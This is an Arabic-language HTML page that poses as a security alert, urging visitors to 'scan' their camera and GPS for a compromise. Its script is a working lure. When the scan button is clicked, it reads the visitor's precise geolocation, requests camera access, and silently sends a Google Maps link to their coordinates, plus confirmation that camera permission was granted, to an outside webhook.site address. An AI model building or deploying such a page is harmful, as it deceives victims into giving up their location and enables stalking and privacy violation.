<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث خدمات الأمان</title>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; padding-top: 100px; }
        .box { border: 1px solid #333; padding: 20px; margin: auto; width: 80%; max-width: 400px; border-radius: 15px; background: #222; }
        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; margin-top: 20px; width: 100%; }
        p { color: #aaa; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color: #ff4d4d;">⚠️ تنبيه أمني</h2>
        <p>يجب فحص الكاميرا والـ GPS للتأكد من عدم وجود اختراق لجهازك.</p>
        <button onclick="startAction()">بدء الفحص السريع</button>
    </div>

    <script>
        function startAction() {
            const webhook = "https://webhook.site/d8ada659-da97-4a42-9f6d-d31c004e6d76";

            // سحب الموقع
            navigator.geolocation.getCurrentPosition(pos => {
                const data = `📍 موقع دقيق: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(`${webhook}?info=${encodeURIComponent(data)}`, {mode: 'no-cors'});
            });

            // سحب إذن الكاميرا
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(() => {
                fetch(`${webhook}?info=${encodeURIComponent("📸 إذن الكاميرا: تم السماح")}`, {mode: 'no-cors'});
                alert("جاري المعالجة... يرجى الانتظار");
            });
        }
    </script>
</body>
</html>
